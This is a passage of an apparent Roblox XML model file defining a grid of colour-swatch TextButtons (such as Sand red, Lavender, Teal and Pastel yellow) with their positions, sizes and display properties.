											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX2367351C14194DC28DE2804D8366C67E">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4293040960</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Br. yellowish orange</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>30</XO>
											<YS>0</YS>
											<YO>55</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXA7CEB25BB47141869D63D2679206B4A7">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4293572754</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Light orange</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>55</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX1BAD1FFEB6A9464B8679B0FFFE025C5D">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4287986039</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Sand red</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>55</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX2E5AE30E08034425B221C70C5D106B63">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4287388575</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Lavender</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>105</XO>
											<YS>0</YS>
											<YO>55</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX93360AE506234532AD208B1B780BE32A">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4285826717</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Sand blue</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>130</XO>
											<YS>0</YS>
											<YO>55</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX9EDB6DEDB03C49B981C4DD04AF88BC86">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4285438410</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Medium blue</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>155</XO>
											<YS>0</YS>
											<YO>55</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXFBCD3DB3C0F446828FCB588216E91814">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4286091394</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Sand green</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>180</XO>
											<YS>0</YS>
											<YO>55</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX811AF1E91E0944C588B89DE74239D125">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4292330906</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Brick yellow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>80</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX88D77285C27948C4A546BB905E5196F2">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294830733</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Cool yellow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>30</XO>
											<YS>0</YS>
											<YO>80</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXD6BA3A194E33494081DF7DFFE2DDD161">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4292178749</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Neon orange</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>80</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX58819EA9A3BB4A97BBD0A5F45C2A5322">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4292511354</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Medium red</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>80</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX6F3CAAC97CCB4F018910C2C4AD28B6E3">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4293442248</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Light reddish violet</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>105</XO>
											<YS>0</YS>
											<YO>80</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX41AF8FAE9D8A4254BFBCFCA1DAE39687">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4286626779</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Pastel Blue</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>130</XO>
											<YS>0</YS>
											<YO>80</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX5AE48E54701E42ADB969BC9049BF8138">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4279430868</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Teal</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>155</XO>
											<YS>0</YS>
											<YO>80</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX2A83C09D158F4802A0235A024B5066C7">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4288791692</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Medium green</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>180</XO>
											<YS>0</YS>
											<YO>80</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX238B1F219A80487C8817638C3C72DDEA">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294954137</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Pastel brown</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>105</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX78B1CA1FB02A44CDB6160A6C4D02C3A6">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294967244</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Pastel yellow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>30</XO>
											<YS>0</YS>
											<YO>105</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
